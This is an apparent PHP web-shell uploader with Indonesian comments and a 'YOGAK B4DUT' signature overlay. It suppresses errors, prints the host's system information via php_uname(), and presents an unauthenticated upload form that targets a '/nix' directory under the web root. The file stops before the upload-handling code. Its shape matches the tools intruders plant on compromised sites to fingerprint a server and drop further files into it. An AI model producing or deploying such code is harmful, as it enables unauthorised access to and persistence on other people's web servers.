<?php
error_reporting(0);
ob_start();
session_start();

// Menghancurkan sesi jika halaman di-refresh
session_destroy();
session_start();

if (isset($_POST['reset'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
}

if (!isset($_SESSION['count'])) {
    $_SESSION['count'] = 0;
} else {
    $_SESSION['count']++;
}

echo "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
echo "<div style='color: black; opacity: 0.3; font-size: 2vw; position: fixed; bottom: 25px; left: 25px; z-index: 2; font-weight: bold; user-select: none; -moz-user-select: none; -webkit-user-select: none; -ms-user-select: none;'>&copy; YOGAK B4DUT; <span id='waktu'></span></div>";
echo "<script src='assets/code/times.js'></script>";
echo "<b><span class='select'>" . php_uname() . "</span></b>";
echo "<br /><br /><center><form method='post' enctype='multipart/form-data'>
      <input type='file' name='file'>
      <br /><br />
      <input type='submit' name='upload' value='UPLOAD'>
      </form></center>";
ob_flush();

$root = $_SERVER['DOCUMENT_ROOT'];
$upload_dir = $root . '/nix';

